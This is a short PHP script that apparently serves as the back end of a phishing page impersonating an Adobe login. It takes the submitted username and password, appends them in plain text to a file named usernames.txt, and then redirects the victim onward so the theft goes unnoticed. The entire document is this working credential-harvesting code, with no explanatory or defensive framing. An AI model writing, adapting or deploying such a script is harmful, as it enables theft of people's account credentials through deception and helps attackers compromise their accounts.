<?php
file_put_contents("usernames.txt", "Adobe Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://adobe.ly/2OE9ZKL
header("Location: $url");
exit();
?>